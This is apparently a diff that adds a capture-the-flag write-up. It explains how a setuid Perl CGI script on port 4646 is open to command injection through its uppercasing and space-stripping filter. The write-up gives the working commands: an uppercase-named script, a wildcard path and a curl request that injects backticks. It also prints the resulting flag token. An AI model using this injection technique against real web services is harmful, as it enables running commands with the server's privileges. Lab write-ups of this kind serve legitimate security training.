@@ -1,0 +1,26 @@
+for this level we have a suid perl script own by the user flag13
+that serve a local server on port 4646
+
+the server is a http server that use GCI
+
+the script eval the shell command with the `x` parameter
+	$xx =~ tr/a-z/A-Z/;
+	$xx =~ s/\s.*//;
+	@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+here we got a command evaluation for grep with a string that pass throught a regex modifier
+any alphabetic character are transform to uppercase character
+then if there is a whitespace, it and all the following character will be remove
+
+so we create a script in uppercase that send the getflag command to a file
+
+$> echo 'getflag > /tmp/lv12' > /tmp/MAJUSCULE
+$> chmod +x /tmp/MAJUSCULE
+
+the wildcard here will match only the /tmp/MAJUSCULE file
+since there isn't any other file that match the /*/MAJUSCULE path
+
+$> curl 'localhost:4646?x=`/*/MAJUSCULE`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+this token is the level13's password
